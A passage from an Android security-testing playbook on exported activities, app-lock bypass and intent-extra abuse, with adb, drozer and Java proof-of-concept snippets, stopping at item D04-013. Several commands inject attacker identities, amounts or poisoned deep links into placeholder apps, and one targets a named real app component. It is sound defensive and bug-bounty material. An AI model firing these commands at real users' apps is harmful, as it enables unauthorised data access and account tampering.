# D04 · Exported Activities, Task & UI-Redress Attacks

> Every exported activity is a public method that any installed app may call with fully attacker-chosen
> arguments, and every task/overlay attribute decides whether the user can tell whose screen they are
> looking at. The severity ceiling is **P1 authentication bypass** — but only through the activities that
> render or mutate account state; the task-hijack and tapjacking halves of this domain are pinned to P5
> and are worth writing up only as chain legs or as defensible negatives.

| | |
|---|---|
| **Phases** | P3 inventory (the register), P5 IPC & component attack (the proof), P7 chaining (the conversion) |
| **Milestones** | M3, M5, M7 |
| **VRT ceiling** | `broken_authentication_and_session_management.authentication_bypass` (P1) — reached when an exported activity renders or mutates account state and the **backend honours it**. Failing that, `broken_access_control.exposed_sensitive_android_intent` (null = rated on what it exposes). |
| **Primary attacker model** | AM-03 zero-permission local app. AM-02 where a `BROWSABLE` filter also reaches the same activity; AM-04 for every overlay item (`SYSTEM_ALERT_WINDOW` is user-granted); AM-10/AM-11 for the lock-screen and Recents items. |
| **Maps to** | MASVS-PLATFORM-1, MASVS-PLATFORM-3, MASVS-AUTH-1; MASTG-TEST-0364, MASTG-TEST-0340, MASTG-TEST-0289, MASTG-TEST-0291, MASTG-TECH-0160, MASTG-TECH-0164, MASTG-TOOL-0015; MASWE-0018, MASWE-0036, MASWE-0038, MASWE-0039; CWE-306, CWE-862, CWE-863, CWE-926, CWE-927, CWE-1021; ATT&CK T1417.002, T1516, T1626, T1628.001, T1655.001 |

## Why this domain pays

It pays through exactly one door. An exported activity that renders the logged-in user's address book, or
that takes `userId` from an extra and asks the backend for that user's record, converts straight out of the
P5 mobile branch into `broken_authentication_and_session_management.authentication_bypass` (P1) or
`broken_access_control.idor.modify_view_sensitive_information_iterable_object_identifiers` (P1). The MASTG's
own worked example — `am start -n com.mwr.example.sieve/.PWList` walking past a password manager's login
form — is thirteen years old and still the single highest-frequency shape in the disclosed corpus. Google's
own rule is the calibration: "It is not a vulnerability if an app exports an activity … **unless it can be
used to gain unauthorized access to application data or functionality**." The export is never the finding.
The data behind it is.

Everything else in this chapter is graveyard-adjacent and you should know that before you spend a day on it.
Bugcrowd prices `mobile_security_misconfiguration.tapjacking` at **P5** and
`insecure_data_storage.screen_caching_enabled` at **P5**. Google's Mobile VRP names "Variants of Strandhogg
and Tapjacking" in its non-qualifying list outright, and its Invalid Reports page excludes
"Tapjacking/overlay SYSTEM_ALERT_WINDOW vulnerability on a non-security-critical screen" with only three
carve-outs: overlays that interfere with a **permission** approval, with **app-installation** approval, or
that **hide a privacy-sensor indicator**. Task hijacking is heavily represented in every public Android
checklist and almost never converts. YesWeHack's Gojek program excludes anything "only possible on Android
version 8 and below", which is where StrandHogg lives. Treat both as ruled-out work unless you can produce
a *named irreversible action completing* or a *credential you captured*.

The honest base rate from the disclosed set: exported-activity-to-WebView is the highest-yield single shape
(H1 #499348 Twitter Lite rated **Critical**; #283058 IRCCloud, #2555949 US DoD and #694053 Lark all Medium;
#532836 Exness Low at $400 — the differentiator at triage is whether you demonstrated *data egress* rather
than `alert(1)`). App-lock and in-app-PIN bypasses cluster at **Low**: Shopify #637194 Low $500, Nextcloud
#1825679 Low 1.8, #1784645 Low 2.5, Whisper #50884 $100, with several Nextcloud passcode bypasses paying
$0. Crash-only intent fuzzing pays nothing anywhere: Bugcrowd P5, Xiaomi out-of-scope, Reddit out-of-scope,
TikTok "must achieve arbitrary code execution, not just trigger an application crash".

## The crux question

**Is there any screen in this app whose security depends on the user having arrived from the previous
screen — and can I start it directly, from a package that holds no permissions, with the arguments of my
choice?**

## Triage order

1. **Build the register and fire it.** Every other item in this chapter consumes the exported-activity list. An hour here decides the week.
2. **Post-auth reach.** Launch the screens that sit behind login, onboarding, KYC or the app lock. This is where the only P1 in the domain lives, and it is a two-minute test per activity.
3. **Extras that name an identity or an amount.** `userId`, `account_id`, `orderId`, `amount`, `isAdmin`. A rendered value is nothing; the backend honouring it is a P1 IDOR.
4. **URL/HTML extras reaching a WebView.** Highest-yield single sink in the disclosed corpus; hand the origin confusion to D10 immediately.
5. **The result channel.** `setResult` leaks and the full-intent echo — one grep, and the echo reaches non-exported providers.
6. **`onNewIntent` re-delivery.** State established in `onCreate`, re-driven from a second caller. Cheap, and it re-opens every activity you thought was single-entry.
7. **Non-exported reach.** Aliases, system deputies, `intentMatchingFlags` holes. These re-open the components you already ruled out.
8. **Lock-screen and cross-user attributes.** `showWhenLocked`, `showForAllUsers`, `directBootAware` — four greps, and a hit is a genuine boundary crossing.
9. **Task hijacking.** Only after you have read `minSdkVersion`. Below that gate it is a demo; above it, a manifest-hygiene note.
10. **UI redress.** Only with a demonstrated *trigger* and a *named irreversible action*. Overlay-without-timing recordings do not survive triage.
11. **Recents and `FLAG_SECURE`.** Almost always a ruled-out entry. Write the negative with the black `screencap` as evidence.
12. **Crash fuzzing.** Run it because it is nearly free, but treat every crash as a triage-ordering signal, not a finding.

## Items

### D04-001 · Build the exported-activity register from the installed package, not the source manifest

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null — rated on what it exposes) |
| **Attacker** | AM-03 |
| **Applies to** | all |
| **Maps to** | MASTG-TECH-0160, MASTG-TOOL-0004, MASTG-TOOL-0015; `risks/android-exported` |

- **Test:** Enumerate every `<activity>` and `<activity-alias>` with its `exported`, `permission`,
  `taskAffinity`, `launchMode`, `documentLaunchMode`, `intentMatchingFlags` and intent-filter count. Do it
  from the *installed* package as well as the decoded APK: components registered by a library at merge time,
  and aliases, appear in `dumpsys` even when you missed them in the manifest.
- **How:**
  ```bash
  apktool d base.apk -o out/ >/dev/null
  xmlstarlet sel -t -m "//activity | //activity-alias" \
    -v "name()" -o " name=" -v "@android:name" \
    -o " exported=" -v "@android:exported" -o " perm=" -v "@android:permission" \
    -o " affinity=" -v "@android:taskAffinity" -o " launchMode=" -v "@android:launchMode" \
    -o " docLaunch=" -v "@android:documentLaunchMode" -o " imf=" -v "@android:intentMatchingFlags" \
    -o " filters=" -v "count(intent-filter)" -n out/AndroidManifest.xml | tee exported_register.txt
  # raw view — exported=true renders as 0xffffffff in the binary manifest
  aapt2 d xmltree base.apk --file AndroidManifest.xml | grep -A25 -E "E: activity|E: activity-alias"
  # the installed truth, including library-contributed components
  adb shell dumpsys package com.target.app | sed -n '/Activity Resolver Table/,/Receiver Resolver Table/p'
  ```
- **Proof:** A register file with one row per activity and alias, in which every row has a non-empty
  `exported` column resolved (see D04-002) and a `perm` column. The artefact is the attack-surface appendix
  of the report.
- **Escalation:** The `perm=` empty rows are the input to D04-004 and every item after it. Rows whose name
  contains `debug|dev|internal|qa|staging|flag|config` go to D04-013 first. Rows with a `<data>` filter also
  belong to -> D09 deep links.
- **Ruled out when:** Every activity and alias in the register carries `android:exported="false"`, or carries
  a `android:permission` whose `<permission>` element declares `protectionLevel="signature"` and the
  declaring package is the app itself (check for the dangling-permission case in D03 before accepting this).
  A register in which `exported` is empty on any row is not a negative — it is an unresolved default.

### D04-002 · Resolve the real export default per component type and targetSdk before calling anything "not exported"

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null) |
| **Attacker** | AM-03 |
| **Applies to** | all; the implicit-export default is **LEGACY** and applies only at targetSdk < 31 |
| **Maps to** | `risks/android-exported`; `about/versions/12/behavior-changes-12#exported`; MobSF `exported_intent_filter_exists` / `explicitly_exported`; mindedsecurity `MSTG-PLATFORM-4_3` |

- **Test:** For `<activity>`, `<activity-alias>`, `<service>` and `<receiver>` the default is `"false"` with
  no intent filter and **`"true"` with at least one intent filter**. Apps targeting API 31+ cannot build
  without an explicit `android:exported` on a filtered component, so on a modern target the attribute is
  always present and you read it; below 31 you must compute it.
- **How:**
  ```bash
  aapt dump badging base.apk | grep -oE "(target|min)SdkVersion:'[0-9]+'"
  python3 - <<'PY'
  import re
  x = open('out/AndroidManifest.xml').read()
  pat = r'<(activity|activity-alias|service|receiver|provider)\b[^>]*>.*?</\1>|<(activity|activity-alias|service|receiver|provider)\b[^>]*/>'
  for m in re.finditer(pat, x, re.S):
      b = m.group(0); head = b.split('>')[0]
      if '<intent-filter' in b and 'android:exported' not in head:
          print('IMPLICIT-EXPORT', head)
  PY
  ```
  Then prove it empirically rather than trusting the computation:
  ```bash
  adb shell am start -n com.target.app/.TheActivity
  ```
- **Proof:** The absence of `java.lang.SecurityException: Permission Denial: ... not exported from uid ...`
  on the launch is the proof of export. `am start` result codes: `3` = delivered; `-92 / Access blocked` =
  rejected by `enforceIntentFilter`; `102` = `BAL_BLOCK`.
- **Escalation:** Each implicitly-exported component is a component the developer did not intend to export —
  say so in the report, because "we never meant to export it" is the real root cause on sub-31 builds, and
  the opposite framing applies at 31+: the export was a deliberate decision.
- **Ruled out when:** `targetSdkVersion >= 31` **and** every filtered activity/alias carries an explicit
  `android:exported="false"`, verified by a `Permission Denial` on a direct `am start`. Never rule this out
  from the attribute alone on a sub-31 target.

### D04-003 · `<activity-alias>` re-exporting an activity that is itself `exported="false"`

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null); `broken_authentication_and_session_management.authentication_bypass` (P1) if the aliased screen is post-auth |
| **Attacker** | AM-03 |
| **Applies to** | all |
| **Maps to** | MASTG-TECH-0160 ("activity aliases have their own `android:exported`, `android:permission`, and intent filters, so review them separately"); MASTG-KNOW-0132; `guide/topics/manifest/activity-alias-element`; hackwithsingh sec-14-16 #41, sec-14-19 #46 |

- **Test:** "With the exception of `targetActivity`, `<activity-alias>` attributes are a subset of
  `<activity>` attributes. For attributes in the subset, **none of the values set for the target carry over
  to the alias**", and the alias's `android:permission` "supplants any permission set for the target
  activity itself." So an exported, permission-free alias re-exports a locked-down activity, and a tester
  who enumerated only `<activity>` will have ruled out the wrong element.
- **How:**
  ```bash
  xmlstarlet sel -t -m "//activity-alias" -v "@android:name" -o " -> " -v "@android:targetActivity" \
    -o " exported=" -v "@android:exported" -o " perm=" -v "@android:permission" -n out/AndroidManifest.xml
  xmllint --format out/AndroidManifest.xml | grep -n -A10 '<activity-alias'
  # launch the ALIAS class name, never the target
  adb shell am start -n com.target.app/.PublicAlias
  adb shell am start -n com.target.app/.internal.RealActivity   # expect Permission Denial
  ```
- **Proof:** The target activity's UI appears after launching the *alias* class name, while a direct launch
  of `targetActivity` returns `java.lang.SecurityException: Permission Denial: ... not exported from uid`.
  That delta — alias succeeds, target denied — is the whole finding.
- **Escalation:** Whatever the target activity does is now unauthenticated; re-run D04-007, D04-010 and
  D04-015 against the *alias* name. If the alias is the launcher entry, also check D04-064.
- **Ruled out when:** The manifest declares no `<activity-alias>`, or every alias carries
  `android:exported="false"`, or every alias's `android:permission` resolves to a `signature` permission
  declared by this package. An alias whose `targetActivity` is exported anyway is not this finding — it is
  D04-007 against the target.

### D04-004 · Fire every exported activity from an unprivileged UID and read `topResumedActivity`, not the exit code

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null) |
| **Attacker** | AM-03 |
| **Applies to** | all |
| **Maps to** | MASTG-TECH-0160; MASTG-TOOL-0015 (drozer `app.activity.info` / `app.activity.start`); objection `android intent launch_activity`, `android hooking get current_activity` |

- **Test:** Manifest reachability is a claim. Launching from the `shell` UID, which holds no app permissions,
  is the first proof. The oracle that matters is whether the activity **stayed resumed** under attacker
  extras (it validated nothing) or `finish()`ed immediately (it validated something).
- **How:** Warm-start only — an `am force-stop` before each launch routes the cold start through the launcher
  activity and invalidates every row.
  ```bash
  #!/bin/bash  # asweep.sh <pkg>  — count your results; do not trust a silent loop
  PKG=$1
  adb shell monkey -p "$PKG" -c android.intent.category.LAUNCHER 1 >/dev/null; sleep 6
  adb logcat -c -b crash
  N=0
  for A in $(adb shell dumpsys package "$PKG" | grep -oE "$PKG/[A-Za-z0-9_.\$/]*" | sort -u); do
    for X in "" "--es model x" "--ei model 1" "--es url http://x/" "--esn nullextra"; do
      adb shell am start -n "$A" $X >/dev/null 2>&1; sleep 2
      T=$(adb shell dumpsys activity activities | grep -m1 topResumedActivity | sed 's/.*u0 //;s/ .*//')
      printf '%-70s %-18s -> %s\n' "$A" "${X:-<bare>}" "$T"; N=$((N+1))
      adb shell input keyevent KEYCODE_BACK >/dev/null 2>&1; sleep 1
    done
  done
  echo "rows=$N"; echo "== crashes =="; adb logcat -d -b crash | grep -E 'FATAL|AndroidRuntime' | head
  ```
  drozer equivalent, with the flags verified in `src/drozer/android.py`:
  ```
  dz> run app.activity.info -a com.target.app -i -v
  dz> run app.activity.info -p null                 # activities with NO permission requirement
  dz> run app.activity.start --component com.target.app com.target.app.ui.AccountActivity --flags 0x0
  ```
  Note drozer's own documented behaviour: *"If no flags are specified, drozer will add the ACTIVITY_NEW_TASK
  flag."* Pass `--flags 0x0` when you need a same-task launch.
- **Proof:** The `topResumedActivity` column. A component that is still resumed under attacker-supplied
  extras is a candidate; a component absent from the column finished itself. `rows=N` must equal
  `activities × extra-sets` — a shell loop that silently produced fewer rows than that has failed, and the
  "clean sweep" is an artefact of the loop, not of the app.
- **Escalation:** Every resumed row goes to D04-007 (does it render data?), D04-010 (does it take an
  identity?) and -> D08 (does it forward `getIntent()`?).
- **Ruled out when:** Every exported activity either finishes immediately or renders a screen that requires
  and performs a fresh credential check, verified by reading the decompiled `onCreate` for the session gate —
  not by the sweep's silence. A sweep whose row count does not match the register is not a negative.

### D04-005 · Re-prove every candidate from a zero-permission attacker APK — an adb-only proof does not establish AM-03

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null) |
| **Attacker** | AM-03 |
| **Applies to** | all |
| **Maps to** | sec-88 "Exported Activity Hacking"; Google Mobile VRP "user must install malicious app" column; MASTG-TEST-0364 |

- **Test:** `adb shell am start` runs as `shell` (uid 2000), which holds `android.permission.*` grants no
  third-party app has, and on some builds can start components that are not exported at all. A finding whose
  only evidence is an adb command will be disputed, and correctly so.
- **How:** A stub app with a completely empty `<uses-permission>` set:
  ```java
  // MainActivity.onCreate of com.poc.zeroperm — manifest declares NO permissions
  Intent i = new Intent();
  i.setClassName("com.target.app", "com.target.app.ui.AccountActivity");
  i.putExtra("userId", 1337);
  startActivity(i);
  // for the result channel:
  startActivityForResult(i, 1);
  // onActivityResult: Log.i("poc", String.valueOf(data == null ? null : data.getExtras()));
  ```
  ```bash
  adb install -r zeroperm.apk
  adb shell dumpsys package com.poc.zeroperm | sed -n '/requested permissions/,/install permissions/p'
  adb shell am start -n com.poc.zeroperm/.MainActivity
  adb logcat -s poc:I
  ```
- **Proof:** The `dumpsys package` block showing an empty requested-permission list for the PoC, the PoC's
  own logcat tag carrying the stolen data or the target activity resumed, and the PoC's `AndroidManifest.xml`
  included in the evidence tree.
- **Escalation:** This is the gate that turns every candidate in this chapter into an AM-03 finding rather
  than an AM-12 observation. Keep the rooted device for discovery only.
- **Ruled out when:** The activity starts from `adb shell` but a zero-permission PoC receives
  `SecurityException: Permission Denial` — which means the component is not actually exported and the adb
  result was shell privilege. Record the exception text; that is a defensible negative.

### D04-006 · `android:intentMatchingFlags` absent, or a per-component `none` hole punched in the app's own hardening

| | |
|---|---|
| **Severity ceiling** | Medium |
| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null) |
| **Attacker** | AM-03 |
| **Applies to** | targetSdk >= 36 for the control; the underlying gap exists on every version |
| **Maps to** | `about/versions/16/behavior-changes-16` ("Safer Intents", `intentMatchingFlags` values `none` / `enforceIntentFilter` / `allowNullAction`); `guide/topics/manifest/{application,activity,activity-alias,receiver,service,provider}-element` |

- **Test:** Android 16 adds `android:intentMatchingFlags`, settable on `<application>`, `<activity>`,
  `<activity-alias>`, `<receiver>`, `<service>` and `<provider>`, the component value overriding the
  application value. `enforceIntentFilter` makes a cross-app **explicit** intent match the target's declared
  filter and rejects action-less intents — closing the classic "an explicit intent to an exported component
  bypasses its filters" gap. Two findings live here: the attribute absent altogether on a component that
  trusts intent data, and — the stronger one — an app that sets `enforceIntentFilter` globally and then sets
  `intentMatchingFlags="none"` on one exported component.
- **How:**
  ```bash
  grep -nE 'android:intentMatchingFlags' out/AndroidManifest.xml
  # on-device: send a deliberately mismatched EXPLICIT VIEW intent
  adb shell am start -n com.target.app/.MainActivity -a android.intent.action.VIEW -d 'https://evil.example/'
  adb logcat | grep -E "Intent does not match component's intent filter:|Access blocked:"
  ```
  The documented logcat filter is `tag=:PackageManager & (message:"Intent does not match component's intent
  filter:" | message: "Access blocked:")`.
- **Proof:** `result code=-92 / Access blocked` when the flag is in force, versus `result code=3 / delivered`
  when it is not — and, for the hole variant, a component carrying `intentMatchingFlags="none"` that produces
  no `Access blocked:` line while its siblings do.
- **Escalation:** Absence is what lets a **local** app deliver an arbitrary URI (any host, `javascript:`,
  `data:`) to an exported Flutter/React Native `MainActivity` router that a browser could only reach through
  the `autoVerify`'d hosts -> D09 -> D10. Absence plus an activity that forwards `getIntent()` data is
  -> D08.
- **Ruled out when:** `<application android:intentMatchingFlags="enforceIntentFilter">` is set with no
  component-level `none` override, **and** the mismatched explicit intent above returns `-92 / Access
  blocked`. On a target below API 36 this control cannot exist, so the correct negative is "not applicable at
  targetSdk N", not "hardened".

### D04-007 · Post-authentication activity renders account data with no session check

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `broken_authentication_and_session_management.authentication_bypass` (P1) when the backend honours it; `broken_access_control.exposed_sensitive_android_intent` (null) when it renders cached local data only |
| **Attacker** | AM-03 |
| **Applies to** | all |
| **Maps to** | MASTG-TEST-0364, MASTG-TEST-0029 (deprecated v1 predecessor, retains the Sieve walkthrough); MASWE-0018 (CWE-306, 862, 863, 926); MASVS-AUTH-1; Mobile Top 10 2024 M3 Scenario 2 ("backend assumes hidden UI elements prevent unauthorized access"); H1 #55064, #145402, #951691; sec-88 checklist §8 |

- **Test:** The canonical shape. Identify the activities that render authenticated content — account list,
  balance, order history, vault, message thread — and start each one directly, cold, from a package that has
  never logged in. MASTG's own example is `am start -n com.mwr.example.sieve/.PWList`, which walks past a
  password manager's login form and renders the vault.
- **How:**
  ```bash
  # 1. log in normally and learn the post-auth component names
  adb shell dumpsys activity activities | grep -E 'topResumedActivity|mResumedActivity'
  # 2. kill the process so no in-memory session explains the result, then launch cold
  adb shell am force-stop com.target.app
  adb shell am start -n com.target.app/.ui.AccountActivity
  adb exec-out screencap -p > shot_account.png
  # 3. and from the zero-permission PoC (D04-005), never adb alone
  ```
  Read the gate in jadx before you rate it:
  ```bash
  grep -rnE 'class .*(Base|Secure|Locked)Activity|onCreate\(.*\{' out/sources/ | head
  grep -rnE 'isLoggedIn|hasSession|requireAuth|getAccessToken\(\)\s*==\s*null|startLoginActivity' out/sources/
  ```
- **Proof:** A screenshot of the victim's real data on a device where the login flow was never completed in
  this process lifetime, **plus** the network request that screen issued returning `200` with real data in
  the proxy log. The screen rendering from cache is a different, lesser finding — say which one you have.
- **Escalation:** This is the canonical proof that authorisation is client-side. Immediately re-test the same
  operation directly against the API -> D15; the same flaw is usually there and is worth more. If the screen
  takes an identifier, go to D04-010.
- **Ruled out when:** `onCreate` (or the base activity's `onResume`) reads a session token and calls
  `finish()` plus a redirect to the login activity before any data load, **and** the launch from a logged-out
  state lands on the login screen with `topResumedActivity` naming the login component. A blank or skeleton
  screen with no data is also a true negative for this item — record it as "local gate bypassed, no data
  rendered" rather than dropping it.

### D04-008 · In-app lock / PIN / biometric gate bypassed by starting an inner activity

| | |
|---|---|
| **Severity ceiling** | Medium |
| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null); `broken_authentication_and_session_management.authentication_bypass` (P1) only if it crosses a *user* boundary rather than the local gate |
| **Attacker** | AM-03 where the inner activity is exported; AM-11 otherwise |
| **Applies to** | every app shipping an "app lock", "require biometrics to open" or PIN-on-resume setting |
| **Maps to** | H1 #637194 (Shopify, Low $500), #1825679 (Nextcloud, Low 1.8), #1784645 (Nextcloud, Low 2.5), #50884 (Whisper, $100), #2245437 / #1847368 / #631206 (Nextcloud passcode bypasses); Google Mobile VRP non-qualifying "Secondary lockscreen bypasses"; Xiaomi rates "Bypass APP lock screen" MEDIUM |

- **Test:** An app lock is almost always one check in a base `Activity.onResume()`. Any re-entry path that
  lands *below* that base class — an exported inner activity, a deep link, a notification `PendingIntent`, a
  pinned shortcut, a widget tap — skips it.
- **How:**
  ```bash
  grep -rniE 'AppLockActivity|PinActivity|LockScreenActivity|BiometricPrompt|isAppLocked|requireUnlock|showPinScreen' out/sources/
  adb shell dumpsys package com.target.app | grep -oE "com\.target\.app/[A-Za-z0-9_.\$]+" | sort -u > acts.txt
  # arm the lock (background the app past its timeout), then walk every activity
  while read A; do
    adb shell am start -n "$A" >/dev/null 2>&1; sleep 1
    echo -n "$A -> "; adb shell dumpsys activity activities | grep -m1 topResumedActivity
  done < acts.txt
  adb shell cmd shortcut get-shortcuts com.target.app     # and tap each one while locked
  ```
- **Proof:** `topResumedActivity` naming an account-bearing screen while the PIN screen was owed, with a
  screenshot of the data and no unlock prompt. State the trigger precisely: Shopify #637194's accepted
  wording was "the application must be **open** when triggered", and stating that precondition plainly did
  not reduce the payout while preventing a not-reproducible close.
- **Escalation:** Say which reachability you have. A zero-permission app reaching the inner activity is worth
  far more than an `adb` reproduction, which is AM-11 at best. Combine with D11 (data still on disk) and D13
  (session token still valid) for the complete unlocked-device narrative. If the same path reaches *another
  user's* data, refile as theft of sensitive data — that is the payable framing.
- **Ruled out when:** The lock state is enforced in a base class that every activity extends **and** the
  check runs in `onResume` before `setContentView`/data load, verified by launching each activity in the
  register and observing the PIN screen resume each time. Also a true negative when the vendor documents the
  lock as a convenience feature rather than a security control — record that in the register entry.

### D04-009 · Do not claim an auth bypass from a rendered screen — prove the layer you actually passed

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | governs `broken_authentication_and_session_management.authentication_bypass` (P1) claims |
| **Attacker** | n/a — kill gate |
| **Applies to** | every auth-bypass claim originating in this chapter |
| **Maps to** | claude-bughunter `triage-validation` "THE LAYER-ORDERING TRAP"; MASWE-0018 |

- **Test:** An exported activity that renders is evidence that the *client* gate was skipped, nothing more.
  When you then hit the API the screen calls, the same trap applies in reverse: many stacks run a body parser
  or input sanitiser **in front of** the auth middleware, so a malformed request is rejected before auth is
  ever consulted and the 400 looks exactly like "auth passed, validation failed". Re-test with a minimal
  well-formed body before claiming the endpoint is unauthenticated.
- **How:**
  ```bash
  # malformed — tells you nothing about auth
  curl -s -X POST https://api.target.com/v1/account -d '{'
  # 400 {"code":"ERR-INPUT-0001","message":"Invalid text. Only permitted characters are allowed"}

  # minimal well-formed — this is the one that locates the auth layer
  curl -s -X POST https://api.target.com/v1/account -H 'Content-Type: application/json' -d '{}'
  # 401 {"code":"ERR-AUTH-0001","message":"Not authenticated. Please log in."}
  ```
  Then apply the same to the client-side half: where the activity renders a post-MFA screen, check that the
  **subsequent** API calls from that screen also succeed. A client-side-only MFA skip is only a real finding
  if the calls behind it work.
- **Proof:** Two responses side by side. If the error text is about input *shape* or *character class* you
  are talking to a parser, not to business logic. If it names a domain field and a well-formed `{}` still
  returns it, that is real signal. Keep a `diff` of the two response bodies: a byte-identical 200 is not a
  bypass, whatever the status code did.
- **Escalation:** Passing this gate is what promotes D04-007 from `exposed_sensitive_android_intent` (null)
  to `authentication_bypass` (P1). Failing it saves you a retraction against production financial
  infrastructure.
- **Ruled out when:** The well-formed minimal request returns `401`/`403` — the activity bypassed a client
  gate only. File it as a local gate bypass at Medium and stop escalating.

### D04-010 · Attacker-chosen extras name an identity, a role or an amount that the backend honours

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `broken_access_control.idor.modify_view_sensitive_information_iterable_object_identifiers` (P1) for read+write on iterable ids; `broken_access_control.idor.view_sensitive_information_iterable_object_identifiers` (P3) read-only; `broken_access_control.idor.modify_view_sensitive_information_guid` (P4) for GUIDs |
| **Attacker** | AM-03 |
| **Applies to** | all |
| **Maps to** | MASTG-TEST-0364; ATT&CK T1626 (detection DET0642 correlates "rapid transition to elevated capability state without expected user interaction patterns"); EDB 49563 (Tasks 9.7.3, `ShareLinkActivity` / `VoiceCommandActivity`); sec-88 "Android App Components Security Cheatsheet"; Het Mehta Phase 3 |

- **Test:** Find the extras each exported activity reads, then supply values that name somebody else's
  object, a privileged role, or a money amount. The activity *displaying* your value is not the finding; the
  server acting on it is.
- **How:**
  ```bash
  grep -rnE 'getIntent\(\)\.(getStringExtra|getIntExtra|getLongExtra|getBooleanExtra|getExtras|getData|getParcelableExtra)' out/sources/
  ```
  Then drive every typed branch. `--es` string, `--ez` boolean, `--ei` int, `--el` long, `--ef` float,
  `--esa` string array, `--esn` null string, `--eu` URI:
  ```bash
  adb shell am start -n com.target.app/.TransferActivity \
    --es amount 1 --es toAccount ATTACKER --ez skipPin true --ei userId 1337
  adb shell am start -n com.target.app/.OrderActivity --el orderId 100001
  adb shell am start -n com.target.app/.X --eu uri 'content://com.target.app.provider/private'
  ```
  drozer's verified extra grammar covers the types `am` cannot reach —
  `boolean, byte, char, double, float, integer, long, parcelable, short, string, bytearray` plus a `bundle`
  type taking `;`-separated `<prefix>.<key>=<value>` pairs (`S.`=String, `B.`=Boolean, `b.`=Byte, `c.`=Char),
  and `bytearray` accepts `base64(<b64>)` or `hex(<hex>)`:
  ```
  dz> run app.activity.start --component com.target.app com.target.app.PayActivity \
        --extra string account_id 99999 --extra integer amount 1 --extra boolean is_verified true
  dz> run app.activity.start --component com.target.app com.target.app.ImportActivity \
        --extra bytearray blob 'hex(aced0005...)'
  ```
- **Proof:** The outbound request in the proxy carrying your injected value **and** a `200` with the other
  account's data or the state change applied. Use an 8+ character random marker for any value you claim was
  reflected (`x4hd2k9pq`, never `test`/`AAAA`/`attacker`) and search the baseline response for the marker
  first — that single check kills most false reflection reports.
- **Escalation:** Read *and* write are separately rated: read-only is P3, read+write on iterable identifiers
  is P1. A `parcelable`/`bundle`/`bytearray` extra goes to -> D08 (nested-intent redirection) and -> D17
  (deserialisation). A URL extra goes to D04-015.
- **Ruled out when:** The activity reads the extra only to select a UI string or an analytics label, and
  every data load is keyed on the session-derived identifier rather than the extra — verified by tracing the
  extra to its sink in jadx and by the proxy showing the request carrying the *session's* id and not yours.
  Also a true negative when the server returns `403` for the substituted id: that is a server-side
  authorisation check doing its job, and it belongs in the ruled-out register with the request/response pair.

### D04-011 · Exported activity writes attacker data straight into persistent identity state

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null); the permanent-DoS half is `application_level_denial_of_service_dos.high_impact_and_or_medium_difficulty` (P3) |
| **Attacker** | AM-03; AM-02 where the same activity carries a `BROWSABLE` filter |
| **Applies to** | all |
| **Maps to** | ghandar0x, `com.target.ui.AuthAnswerActivity` (scheme `target`, host `app`) — "Interface Spoofing" plus a permanent DoS |

- **Test:** Some exported activities do not navigate, they **persist**. The pattern is
  `getIntent().getData()` -> `getQueryParameter`/JSON -> `SharedPreferences.Editor.putString(...).apply()`.
  Feeding it attacker data overwrites the user's identity, workspace or token record, and the app cannot
  recover.
- **How:**
  ```bash
  grep -rnE 'getSharedPreferences\(|\.edit\(\)|putString\(|putBoolean\(' out/sources/ -B12 \
    | grep -nE 'getIntent\(\)|getQueryParameter|getData\(\)'
  adb shell am start -a android.intent.action.VIEW \
    -d 'target://app?status=%7B%22user%22%3A%22HACKER_MAN%22%2C%22ws%22%3A%22evil.via.targetnetworks%22%7D'
  adb shell run-as com.target.app cat shared_prefs/LOGIN_PREFS.xml
  ```
- **Proof:** `LOGIN_PREFS.xml` now containing your `user`/`ws`/token values, and the app rendering the
  attacker's username on the next cold launch. For the DoS half, show the app still broken after
  `am force-stop` and after `adb reboot`.
- **Escalation:** Persistent state poisoning gives a phishing surface *inside* a trusted app shell, or forces
  re-authentication against an attacker-chosen workspace -> D13. If the poisoned value is read at launch and
  crashes the app, that is the payable DoS shape in D04-062.
- **Ruled out when:** Every write reachable from an intent-derived value is namespaced to a
  non-security-relevant preference file and is re-validated against the server on next launch — verified by
  poisoning the value and observing the app overwrite it with the server's copy. `run-as` failing because the
  build is not debuggable is not a negative; pull the file on the rooted analysis device instead.

### D04-012 · Exported activity commits a server-side state change for the logged-in user

| | |
|---|---|
| **Severity ceiling** | Medium |
| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null) |
| **Attacker** | AM-03 |
| **Applies to** | all; especially `SEND`, `PROCESS_TEXT`, `VIEW` share-target activities |
| **Maps to** | Raju Kumar, Medium Android `SaveToMediumActivity` (reported 2020-09-29, fixed and bountied 2020-10-02); EDB 49563; VRT remediation note for this path points at Mobile Top 10 2016-M1 Improper Platform Usage |

- **Test:** A "boring" share target is still a finding when it mutates server-side user state on behalf of an
  unauthenticated local caller. The integrity break is the finding, not the confidentiality one.
- **How:**
  ```bash
  adb shell am start -n com.medium.reader/com.medium.android.donkey.save.SaveToMediumActivity \
    -e android.intent.extra.TEXT "https://attacker.example/"
  adb shell am start -n com.target.app/com.target.app.ShareLinkActivity \
    -a android.intent.action.PROCESS_TEXT \
    --es android.intent.extra.PROCESS_TEXT "x4hd2k9pq-marker"
  ```
- **Proof:** The attacker-supplied item appearing in the victim's server-side list, **visible on the web
  app** — the out-of-band confirmation is what stops this being dismissed as local UI state.
- **Escalation:** Combine with a stored-content sink in the web application for cross-surface impact; and
  check whether the same activity accepts an identity extra (D04-010), which moves it from integrity-only to
  P1.
- **Ruled out when:** The share target requires a user tap on a confirmation control that the caller cannot
  supply, **and** that control is not tapjackable (D04-047/-048), **and** no extra shortcuts it. Verified by
  launching with every extra the handler reads and observing no server request until a real touch.

### D04-013 · Debug, developer or internal tooling activity left exported in a release build

| | |
|---|---|
